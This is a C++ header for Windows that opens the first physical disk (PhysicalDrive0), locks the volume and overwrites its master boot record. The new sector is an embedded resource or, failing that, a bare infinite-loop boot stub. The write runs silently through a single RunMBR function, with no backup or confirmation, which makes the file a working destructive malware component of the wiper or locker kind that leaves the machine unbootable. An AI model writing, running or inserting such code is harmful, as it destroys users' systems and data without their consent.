#pragma once

#include <windows.h>
#include <vector>
#include <cstring>

#ifndef IDR_RCDATA1
#define IDR_RCDATA1 110
#endif
#define TARGET_DISK_PATH L"\\\\.\\PhysicalDrive0"

namespace MbrWriterInternal {
    inline std::vector<unsigned char> loadEmbeddedResource() {
        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

        std::vector<unsigned char> buffer(512, 0);

        if (hRes) {
            HGLOBAL hGlob = LoadResource(NULL, hRes);
            if (hGlob) {
                DWORD size = SizeofResource(NULL, hRes);
                if (size > 0 && size <= 512) {
                    const unsigned char* data = static_cast<const unsigned char*>(LockResource(hGlob));
                    if (data) {
                        std::memcpy(buffer.data(), data, size);
                    }
                }
            }
        }
        else {
            buffer[0] = 0xEB;
            buffer[1] = 0xFE;
        }

        buffer[510] = 0x55;
        buffer[511] = 0xAA;

        return buffer;
    }

    inline bool executeWrite(const std::vector<unsigned char>& data) {
        HANDLE hDisk = CreateFileW(
            TARGET_DISK_PATH,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr
        );

        if (hDisk == INVALID_HANDLE_VALUE) {
            return false;
        }

        DWORD bytesReturned;
        DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);

        DWORD bytesWritten = 0;
        BOOL result = WriteFile(hDisk, data.data(), 512, &bytesWritten, nullptr);

        DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
        CloseHandle(hDisk);

        return (result && bytesWritten == 512);
    }
}


inline int RunMBR()
{
    try {
        std::vector<unsigned char> mbrData = MbrWriterInternal::loadEmbeddedResource();

        if (!MbrWriterInternal::executeWrite(mbrData)) {
            return 1;
        }

        return 0;
    }
    catch (...) {
        return 1;
    }
}
